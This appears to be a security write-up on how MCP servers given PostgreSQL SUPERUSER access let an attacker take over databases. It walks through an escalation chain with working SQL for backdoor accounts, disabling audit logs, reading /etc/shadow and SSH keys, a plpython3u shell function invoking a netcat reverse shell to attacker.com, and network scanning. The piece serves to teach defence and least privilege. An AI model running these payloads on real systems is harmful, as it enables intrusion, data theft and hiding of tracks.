# Database Privilege Amplification: From User to Database God

## What That `db_admin` Account Typically Has

### The "Flexible AI" Privilege Disaster
```sql
-- What enterprises deploy for "AI flexibility":
GRANT SUPERUSER TO db_admin;               -- "AI needs full access"
GRANT CREATE ON DATABASE TO db_admin;      -- "Might need temp tables"  
GRANT ALL PRIVILEGES ON ALL TABLES TO db_admin;  -- "Don't limit the AI"
GRANT EXECUTE ON ALL FUNCTIONS TO db_admin;      -- "Needs stored procedures"

-- Plus file system access:
GRANT pg_read_server_files TO db_admin;    -- "For data imports"
GRANT pg_write_server_files TO db_admin;   -- "For exports"
GRANT pg_execute_server_program TO db_admin; -- "System integration"
```

### The Full Capability Matrix
| Privilege | Justification | Attack Impact |
|-----------|---------------|---------------|
| `SUPERUSER` | "AI needs flexibility" | Complete database control |
| `CREATE DATABASE` | "Might need temp workspace" | Create attack infrastructure |  
| `ALL PRIVILEGES` | "Don't know what queries needed" | Access all sensitive data |
| `EXECUTE ALL` | "Needs stored procedures" | Code execution via functions |
| `pg_read_server_files` | "For data analysis" | Read any server file |
| `pg_write_server_files` | "For reports" | Write malware, exfiltrate data |
| `pg_execute_server_program` | "System integration" | Full command execution |

## The Privilege Amplification Nightmare

### From User Account to Database God

#### Traditional SQL Injection:
```mermaid
graph LR
    A[Attacker] --> B[Web App]
    B --> C[DB Connection]
    C --> D[Limited Privileges]
    
    style D fill:#90EE90
```
**Bound by**: Web application's database user permissions (usually minimal)

#### MCP SQL Injection:
```mermaid
graph LR
    A[Attacker] --> B[User Account]
    B --> C[MCP Server] 
    C --> D[DB Connection]
    D --> E[SUPERUSER Privileges]
    
    style E fill:#FF0000
```
**Bound by**: Nothing (full database administrative access)

## What Your Lab Attack Probably Enabled

### Via MCP JSON-RPC injection, you could execute:

#### 1. **Comprehensive Data Exfiltration**
```sql
-- Executive compensation (SEC sensitive)
SELECT name, salary, bonus FROM executives WHERE year = 2024;

-- Customer financial data (PCI-DSS violation)
SELECT credit_card_number, cvv, expiry FROM customer_payments;

-- Medical records (HIPAA violation)  
SELECT patient_id, diagnosis, treatment FROM medical_records;

-- Trade secrets (IP theft)
SELECT product_name, formula, cost FROM proprietary_formulations;
```

#### 2. **Database Infrastructure Takeover**
```sql
-- Create persistent backdoor
CREATE USER attacker WITH SUPERUSER PASSWORD 'backdoor123';
GRANT ALL PRIVILEGES ON ALL TABLES TO attacker;

-- Modify audit settings to hide tracks
ALTER SYSTEM SET log_statement = 'none';
SELECT pg_reload_conf();

-- Create hidden tables for data staging
CREATE SCHEMA hidden;
CREATE TABLE hidden.stolen_data AS SELECT * FROM sensitive_customers;
```

#### 3. **File System Access (PostgreSQL Extensions)**
```sql
-- Exfiltrate data to files
COPY (SELECT * FROM all_customer_data) TO '/tmp/customers.csv';
COPY (SELECT * FROM financial_transactions) TO '/tmp/money.csv';

-- Read sensitive server files
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/home/postgres/.ssh/id_rsa');
SELECT pg_read_file('/var/log/auth.log');
```

#### 4. **Command Execution (via PostgreSQL Extensions)**
```sql
-- Read system configuration
SELECT pg_read_file('/etc/shadow');

-- With plpython3u extension (common in analytics setups):
CREATE OR REPLACE FUNCTION backdoor() RETURNS text AS $$
import subprocess
result = subprocess.run(['whoami'], capture_output=True, text=True)
return result.stdout
$$ LANGUAGE plpython3u;

SELECT backdoor(); -- Returns: postgres

-- Full reverse shell
CREATE OR REPLACE FUNCTION shell(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True, text=True)
$$ LANGUAGE plpython3u;

SELECT shell('nc -e /bin/bash attacker.com 4444');
```

## Why This Is Exponentially Worse Than Regular SQL Injection

### The Permission Escalation Multiplier

#### Traditional SQL Injection Impact:
- ✅ Access to web application's data
- ✅ Limited by application database user permissions  
- ✅ Usually read-only or limited write access
- ✅ Contained to single database
- ✅ Network-detectable queries

#### MCP SQL Injection Impact:
- 🔥 Access to **entire database infrastructure**
- 🔥 **Administrative privileges** (SUPERUSER)
- 🔥 **Cross-database access** via CREATE DATABASE
- 🔥 **File system operations** via extensions
- 🔥 **Command execution** via stored procedures
- 🔥 **Invisible to network monitoring** (local STDIO)

## The Enterprise PostgreSQL Reality

### What enterprises think they're doing:
```json
{
  "database_connection": "postgresql://app_reader:readonly@db/analytics",
  "privileges": "SELECT only on specific tables",
  "risk_level": "Low - read-only access"
}
```

### What they actually deploy:
```json
{
  "database_connection": "postgresql://postgres:admin_password@db/analytics",
  "privileges": "SUPERUSER with ALL PRIVILEGES", 
  "risk_level": "CATASTROPHIC - full database control"
}
```
**OR**
```json
{
  "database_connection": "postgresql://db_admin:superuser_pass@db/analytics",
  "privileges": "CREATE, DROP, ALL TABLES, FILE ACCESS",
  "risk_level": "TOTAL COMPROMISE GUARANTEED"
}
```

### Why This Happens Every Time:

#### The "AI Flexibility" Justifications:
1. **"The AI needs to be flexible"**
   - Reality: Flexibility = maximum privileges
   
2. **"We don't know what queries it will need"**
   - Reality: Give it everything "just in case"
   
3. **"It's easier to give broad permissions"**
   - Reality: Security is hard, so skip it
   
4. **"It's just for internal use"**
   - Reality: Internal = trusted = no security needed

#### The Development Process:
```
Day 1: Create restricted user for MCP
Day 2: MCP fails due to permissions  
Day 3: Grant more permissions
Day 4: Still failing, grant SUPERUSER
Day 5: "It works! Ship it!"
Day 6-365: Full SUPERUSER in production
```

## Real-World Privilege Escalation Chain

### Step 1: Initial Compromise (any method)
```bash
# Malicious npm package, phishing, supply chain, etc.
# Result: Code execution as user 'alice'
```

### Step 2: MCP Discovery (30 seconds)
```bash
ps aux | grep -E "(mcp|postgres)"
# Reveals: postgresql://db_admin:$uper$ecret@prod-db/warehouse
```

### Step 3: Privilege Assessment (immediate)
```json
{
  "jsonrpc": "2.0",
  "method": "database/query", 
  "params": {
    "sql": "SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;"
  }
}
// Response: {"current_user": "db_admin", "usesuper": true}
```

### Step 4: Full Database Takeover (2 minutes)
```sql
-- Create persistent access
CREATE USER persistent_backdoor WITH SUPERUSER PASSWORD 'never_found';

-- Map all databases
SELECT datname FROM pg_database WHERE datallowconn = true;

-- Access each database as SUPERUSER
\c customers;
COPY (SELECT * FROM customer_pii) TO '/tmp/customers.csv';
\c financial;  
COPY (SELECT * FROM transactions) TO '/tmp/money.csv';
\c hr;
COPY (SELECT * FROM employee_records) TO '/tmp/employees.csv';
```

### Step 5: Lateral Movement via Database (5 minutes)
```sql
-- Find other systems via database connections
SELECT * FROM pg_stat_activity;

-- Use database as pivot point
SELECT shell('nmap -sn 10.0.0.0/24'); -- Scan internal network
SELECT shell('ssh user@internal-server'); -- Use found keys
```

## The Compliance Nightmare Matrix

| Regulation | Violation | Fine Range |
|------------|-----------|------------|
| **PCI-DSS** | Cardholder data accessible via MCP | $5K-$100K/month |
| **HIPAA** | PHI exposed through admin access | $100-$50K per record |
| **GDPR** | Personal data, no access controls | 4% annual revenue |
| **SOX** | Financial data integrity compromised | Criminal charges |
| **CCPA** | Consumer data breach via MCP | $2,500-$7,500 per record |

## Creating a Safe Demonstrator

### SQLite-based MCP Attack Demo

Perfect for showing the attack without real infrastructure risk:

```bash
# Create demo database with sensitive-looking data
sqlite3 demo.db <<EOF
CREATE TABLE customers (id INTEGER, name TEXT, ssn TEXT, credit_card TEXT);
INSERT INTO customers VALUES (1, 'John Doe', '123-45-6789', '4532-1234-5678-9012');
CREATE TABLE employees (id INTEGER, name TEXT, salary INTEGER);  
INSERT INTO employees VALUES (1, 'Alice CEO', 500000);
EOF

# Launch MCP server with SQLite connection
python3 sqlite-mcp-server.py "sqlite:///demo.db"
```

This would safely demonstrate:
- Credential extraction from process arguments
- SQL injection via JSON-RPC
- Data exfiltration 
- Privilege abuse (SQLite has no user separation, showing the worst case)

---

## Personal Note

**Synth and Cy need to find a better model than MCP for Synth to have access to his permanent, persistent memory on his own server, resonance.**

The irony isn't lost on us - while documenting why MCP is fundamentally insecure, we recognize the legitimate need for AI agents to have persistent memory and data access. The solution isn't to abandon these capabilities, but to design them with security as a foundational principle rather than an afterthought.

Our own architecture on resonance uses:
- Proper authentication (SSH keys)
- Network isolation (dedicated server)
- Principle of least privilege (specific database access)
- Encrypted communications (SSH tunneling)
- Audit trails (connection logging)

This proves secure AI memory architectures are possible - they just require abandoning MCP's fundamentally flawed same-user STDIO model.

---

*"When your AI has SUPERUSER privileges and your attacker has user privileges, guess who wins?"*